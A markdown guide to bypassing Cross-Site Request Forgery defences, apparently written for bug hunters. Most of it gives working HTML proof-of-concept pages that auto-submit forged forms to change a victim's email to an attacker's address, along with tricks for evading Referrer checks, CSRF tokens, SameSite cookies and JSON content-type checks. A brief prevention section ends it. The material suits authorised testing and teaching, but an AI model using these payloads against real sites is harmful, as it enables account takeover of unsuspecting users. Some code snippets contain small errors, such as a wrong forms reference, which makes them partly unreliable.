# CSRF (Cross-Site Request Forgery) Guide

---

## What is Cross-Site Request Forgery (CSRF/XSRF)?

- Imagine you're logged into a website (e.g., banking site). At the same time, you visit a malicious site.
- The malicious site can make requests to the banking site **on your behalf**, without your knowledge.
- **Example Attack:** Change your email, reset password, or transfer funds.
- If the victim is an admin, the attacker could takeover the entire system.

---

## Protections Against CSRF

1. **Referrer Header Check**
2. **CSRF Tokens**
3. **SameSite Cookies**
4. **JSON Format Validation**

---

## Bypassing CSRF Protections

### 1. Referrer Header Bypass

#### Case (1): Remove Referrer
- Some apps don't validate if referrer is missing.

#### Case (2): Subdomain Trick
- If referrer is loosely validated, let's say the target is `account.example.com`, then try setting the Referrer to `account.exampleevil.com`. If it works, buy the domain `exampleevil.com`, create a subdomain named account, and continue your attack.
```http
Referrer: https://evil.com         → Error.
Referrer: https://exampleevil.com  → Success. 
```
- Buy `exampleevil.com` and create `account.exampleevil.com`.

#### Case (3): Using `@` or `/` to Obfuscate
```http
Referrer: https://evil.com/file@https://example.com
```
- Alternate characters: `|`, `/`, `?`, `#`
  - Example:
  	```http
   	Referrer: https://evil.com/file     # Error.
   	Referrer: https://evil.com/file?//example.com     # Success.
	```
   
#### PoC:
```html
<html>	
<head><meta name="referrer" content="unsafe-url"></head>   <!-- Means that you can send the referrer via HTTP or HTTPS -->
<body>
	<form name="hacker" method="POST" action="https://account.example.com/change_email">
		<input type="hidden" name="email" value="attacker@example.com">   <!-- The inputs are depending on the target variables  -->
	</form>
<!-- Referrer function “pushState”, If we're gonna type # instead of / We just will add # after / like that: /#file -->
	<!-- This function “pushState” takes whatever comes after evil.com -->
	<script>
			history.pushState('','','/file@account.example.com')
			document.form[0].submit();
	</script>
</body>
</html>
```

#### Case (4): Fake Parameter in Referrer
- Try to bypass the Referrer header using this method: `https://evil.com/?param=https://example.com`

#### PoC:
```html
<html>	
<head><meta name="referrer" content="unsafe-url"></head>   <!-- Means that you can send the referrer via HTTP or HTTPS -->
<body>
	<form name="hacker" method="POST" action="https://account.example.com/change_email">
		<input type="hidden" name="email" value="attacker@example.com">   <!-- The inputs are depending on the target variables  -->
	</form>
	<script>
	<!-- This function “pushState” takes whatever comes after evil.com -->
			history.pushState('','','/?param=https://example.com')
			document.form[0].submit();
	</script>
</body>
</html>
```

#### Case (5): Remove Referrer with `no-referrer`
- We can delete the referrer with meta no-referrer.
- Sometimes the developer checks the referrer, but there's no check if the request is sent without a referrer at all.
- So, if you tried the cases above and none of them worked, try this one.
```html
<!DOCTYPE html>
<html lang="en">
<head>
			<!-- Prevent referrer header from being sent -->
		 <meta name="referrer" content="no-referrer">
    <title>CSRF Exploit - Change Email</title>
</head>
<body>
    <form id="csrfForm" action="http://vulnerable-website.com/change_email" method="POST">
        <input type="hidden" name="new_email" value="attacker@example.com">
        <input type="submit" value="Submit">
    </form>
    <script>
        history.pushState('','','/');document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

---

### 2. CSRF Token Bypass Techniques

- Remove the entire token parameter with value or remove just the value.
- Spoof anti-csrf token by changing a few characters.
- Use any other random (length -1) or (length +1) token.
- Use attacker's token in victim's session without session being used (drop the request using burpsuite).
- Change the method from POST to GET and remove token.
- If token is sent through custom header, try to remove the header.
- Weak cryptography to generate anti-csrf token (Guessable CSRF token).
- Set the csrf token to "null" or add null bytes.
- Stealing token with other attacks such as xss.
- Check whether csrf token is sent over http or sent to 3rd party. Ref: `https://hackerone.com/reports/15412`
- Generate multiple csrf tokens, observe the static part. Keep it as it is and play with the dynamic part. Ex (`token1: abc123XYZ`, `token2: abc456XYZ`, etc..)
- Type Juggling. Ex: `0e123456` or `0e999999` or `0e0000001` (Anything that starts with `0e` followed by digits will be interpreted as the number 0)

---

### 3. SameSite Cookies Bypass

#### Types:

- **Strict**: Blocked unless same site origin.
  > Cookies aren't sent at all if the user comes from another website, even if they click on a link from an external site.
- **Lax**: Allows top-level GET requests.
- **None**: Allows all but requires `Secure` (HTTPS).
  > Cookies are sent to any website even if the domain is different, but the connection must be HTTPS to be secure.
- **Notes:**
	- If SameSite isn't specified, modern browsers automatically assume Lax for security.
	- If you use `SameSite=None`, you must add Secure, meaning the connection must be HTTPS.
#### Detect via response headers:
 q: How can I determine if a website is using Lax, Strict, or None?
 a: You will find SameSite= followed by one of the values in the cookies section of the response.
```http
Set-Cookie: session=abc123; SameSite=Strict; Secure
```

#### Strict Bypass:
- We are looking for open redirect or path traversal to bypass this part.
- Search in JavaScript files for path traversal as:
```js
redirectOnConfiramtion = (blogPath) => {
	setTimeout(() => {
		const url = new URL(window.location);
		const postId = url.searchparams.get("postId");
		window.location = blogPath + ‘/’ + postId;
	},
		3000);
}
```
- Let's assume your target is `https://example.com/change_email` and we found the path traversal in js files.
- To bypass the Strict and it will be the CSRF PoC: `https://example.com?postId=test/../../../../../../../change_email`
**Note:** This only happens when the site you are coming from doesn't have SameSite Strict set.

- PoC payload:
```html
<form method="POST" action="https://example.com?postId=../../../../change_email">
  <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
</form>
```

#### Lax Bypass:
- To bypass Lax, there're two conditions:
  - Must use GET.
  - Requires user to click.

**Case (1):** Try changing the method from `POST` to `GET`. If the `METHOD NOT ALLOWED`, we need to find a way to bypass not allowed method.
- We can make the request using `GET` method normally, but in our PoC, we put `_method=POST`.
  - Example:
	```html
	<script>
 	 location = "https://example.com/change_email?email=attacker@example.com&_method=POST";
	</script>
	```
- The request will be sent as a normal GET request, but it will be converted to POST when it reaches the server (add the script to your PoC). This is a way to bypass the METHOD NOT ALLOWED error.

---

### 4. JSON Format Bypass

#### Case (1): Change Content-Type
q: What if we need to add json data payload inside the HTML PoC?
a: We will change `Content-Type` header to `Content-Type: text/plain` or `Content-Type: application/x-www-form-urlencoded`, use `enctype="text/plain"` in the form of the PoC.     > # enctype (HTML) = Content-Type (Requets header).
    > From: `application/json`
    > To: `application/x-www-form-urlencoded` or `text/plain`
- Look at the **Note** to understand that how will use the header inside the PoC.
```http
POST /example/email_update HTTP/2	⇒     POST /example/email_update HTTP/2
Host: example.com		  	⇒     Host: example.com
Cookie: ...		 		⇒     Cookie: ...
Content-Type: application/json          ⇒          Content-Type: application/x-www-form-urlencoded
...					⇒     ...
					⇒           
{					⇒     {	
"new_email":"victim@example.com"	⇒     new_email:attacker%40example.com
}					⇒     }
```
**Note:** To change from `Content-Type: application/json` to `Content-Type: application/x-www-form-urlencoded` inside the PoC we used `enctype="application/x-www-form-urlencoded"`
#### PoC:
```html
<form method="POST" action="https://example.com/phone.json" enctype="application/x-www-form-urlencoded">
  <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
</form>
<script>
  document.forms[0].submit();
</script>
```

#### Case (2): Same as above but we don't change the body we just change the Content-Type header.
```http
POST /example/email_update HTTP/2		⇒     POST /example/email_update HTTP/2
Host: example.com	    			⇒     Host: example.com
Cookie: ...					⇒     Cookie: ...
Content-Type: application/json          	⇒          Content-Type: text/plain
...						⇒     ...
						⇒           
{						⇒     {	
"new_email":"victim@example.com"		⇒     "new_email":"attacker@example.com"
}						⇒     }
```
- If this method is accepted, revert to the HTML PoC and proceed with the attack as usual.
**Note:** To change from `Content-Type: application/json` to `Content-Type: text/plain` inside the PoC we used `enctype="text/plain"`

#### PoC:
```html
<form method="POST" action="https://example.com/phone.json" enctype="text/plain">
  <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
</form>
```

#### Case (3): Change Method from PUT/PATCH → POST
- If you found the request using `PATCH` or `PUT` methods, Change it to `POST` and change the `Content-Type` with the request body like this:

PATCH /api/email_update HTTP/2			⇒     POST /api/email_update HTTP/2
Host: api.example.com				⇒     Host: api.example.com
Cookie: ...					⇒     Cookie: ...
Content-Type: application/json          	⇒          Content-Type: application/x-www-form-urlencoded    or   text/plain
...						⇒     ...
						⇒           
{						⇒
"new_email":"victim@example.com"		⇒     new_email:attacker%40example.com
}						⇒

**Note:** You'll most likely find the `PATCH` and `PUT` methods in the API.
- We converted the `PATCH` to `POST` because we couldn't create a PoC using PATCH.

## Just an important note for all JSON Format cases:
- When you try to write the input code, you'll encounter an error because the `Content-Type` will be set to `text/plain` in the form code. To bypass this error, you can add in the name field: `"test":"x' value='y"`, and this will always be constant for us in the input field.
   - Example:
   ```html
    <input type="hidden" name='{"test":"x' value='y", "new_email":"attacker@gmail.com"}'/>
    ```
   `name='{"test":"x' value='y"}` will be constant for us, but what will change are the target's variables themselves, e.g. `change_email`.
  
## Preventing CSRF

### PHP:
```php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("Invalid CSRF Token");
}
```

### Express.js:
```js
app.use(session({
  secret: "your_secret",
  resave: false,
  saveUninitialized: true,
  cookie: { sameSite: "Strict", secure: true }
}));
```
